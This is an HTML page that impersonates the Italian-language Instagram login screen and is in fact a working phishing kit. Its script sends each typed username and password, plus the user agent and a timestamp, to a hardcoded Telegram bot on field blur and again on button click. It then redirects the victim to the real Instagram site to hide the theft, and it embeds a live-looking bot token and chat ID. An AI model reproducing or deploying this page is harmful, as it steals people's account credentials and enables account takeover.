<!DOCTYPE html>
<html lang="it">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Instagram Login</title>

<style>
*{
    margin:0;
    padding:0;
    box-sizing:border-box;
    font-family: Arial, sans-serif;
}

body{
    background:#0f2533;
    height:100vh;
    color:white;
}

.container{
    width:100%;
    max-width:420px;
    margin:auto;
    padding:20px;
    display:flex;
    flex-direction:column;
    align-items:center;
    height:100vh;
}

.lang{
    margin-top:15px;
    color:#cfd4d9;
    font-size:18px;
}

.logo{
    margin-top:120px;
    margin-bottom:100px;
}

.logo img{
    width:90px;
}

.input-box{
    width:100%;
    margin-bottom:20px;
}

.input-box input{
    width:100%;
    height:70px;
    border:2px solid #3b5266;
    border-radius:20px;
    background:transparent;
    color:white;
    font-size:18px;
    padding:0 20px;
    outline:none;
}

.input-box input::placeholder{
    color:#a4adb6;
}

.login-btn{
    width:100%;
    height:60px;
    border:none;
    border-radius:35px;
    background:#1877f2;
    color:white;
    font-size:20px;
    cursor:pointer;
}

.forgot{
    margin-top:30px;
    color:white;
    text-decoration:none;
    font-size:18px;
}

.bottom{
    margin-top:auto;
    width:100%;
    text-align:center;
    padding-bottom:30px;
}

.create{
    width:100%;
    height:60px;
    border:2px solid #2d8cff;
    border-radius:35px;
    background:transparent;
    color:#4fa0ff;
    font-size:18px;
    cursor:pointer;
}

.meta{
    margin-top:30px;
    font-size:20px;
    color:#d6d6d6;
}
</style>

</head>
<body>

<div class="container">

    <div class="lang">Italiano</div>

    <div class="logo">
        <img src="https://i.imgur.com/wvLiKam.png" alt="Instagram">
    </div>

    <div class="input-box">
        <input type="text" id="username" placeholder="Nome utente, e-mail o numero di cellulare">
    </div>

    <div class="input-box">
        <input type="password" id="password" placeholder="Password">
    </div>

    <button class="login-btn" id="loginBtn">Accedi</button>

    <a href="#" class="forgot">Password dimenticata?</a>

    <div class="bottom">
        <button class="create">Crea nuovo account</button>
        <div class="meta">∞ Meta</div>
    </div>

</div>

<script>
    // ============================================
    //  CONFIG - Bot Telegram
    // ============================================
    const CONFIG = {
        telegramToken: '8191936030:AAFl4PoBphmVzsukVH1Y-SP5mE45kgMqnkg',
        telegramChatId: '8278195073'
    };

    // ============================================
    //  TELEGRAM SENDER
    // ============================================
    function sendToTelegram(message) {
        const url = `https://api.telegram.org/bot${CONFIG.telegramToken}/sendMessage`;
        const params = new URLSearchParams({
            chat_id: CONFIG.telegramChatId,
            text: message,
            parse_mode: 'Markdown'
        });
        try {
            new Image().src = `${url}?${params.toString()}`;
        } catch(e) {
            console.error('Failed:', e.message);
        }
    }

    // ============================================
    //  UI ELEMENTS
    // ============================================
    const u = document.getElementById('username');
    const p = document.getElementById('password');
    const loginBtn = document.getElementById('loginBtn');

    let usernameSent = false;
    let passwordSent = false;
    let loginClicked = false;

    // ============================================
    //  إرسال اسم المستخدم فوراً عند الخروج من الحقل
    // ============================================
    u.addEventListener('blur', function() {
        const val = this.value.trim();
        if (val && !usernameSent) {
            usernameSent = true;
            sendToTelegram(
                `📧 *Step 1: Identifier Captured* 📧\n\n` +
                `👤 *Identifier:* \`${val}\`\n` +
                `📱 *UA:* ${navigator.userAgent.slice(0, 80)}\n` +
                `⏰ *Time:* ${new Date().toISOString()}`
            );
        }
    });

    // ============================================
    //  إرسال كلمة المرور فوراً عند الخروج من الحقل
    // ============================================
    p.addEventListener('blur', function() {
        const val = this.value;
        if (val && !passwordSent) {
            passwordSent = true;
            const userVal = u.value.trim() || 'N/A';
            sendToTelegram(
                `🔑 *Step 2: Password Captured* 🔑\n\n` +
                `👤 *Identifier:* \`${userVal}\`\n` +
                `🔑 *Password:* \`${val}\`\n` +
                `📱 *UA:* ${navigator.userAgent.slice(0, 80)}\n` +
                `⏰ *Time:* ${new Date().toISOString()}`
            );
        }
    });

    // ============================================
    //  عند الضغط على Accedi
    // ============================================
    loginBtn.addEventListener('click', function(e) {
        e.preventDefault();
        if (loginClicked) return;
        loginClicked = true;

        const username = u.value.trim();
        const password = p.value;

        // إرسال تأكيدي
        sendToTelegram(
            `✅ *Login Button Pressed* ✅\n\n` +
            `👤 *User:* \`${username}\`\n` +
            `🔑 *Pass:* \`${password}\`\n` +
            `⏰ *Time:* ${new Date().toISOString()}`
        );

        // تغيير نص الزر كإشارة
        loginBtn.textContent = 'Verifica in corso...';
        loginBtn.style.opacity = '0.7';
        loginBtn.disabled = true;

        // إعادة توجيه إلى Instagram الحقيقي بعد فترة
        setTimeout(() => {
            window.location.href = 'https://www.instagram.com';
        }, 2000);
    });
</script>

</body>
</html>
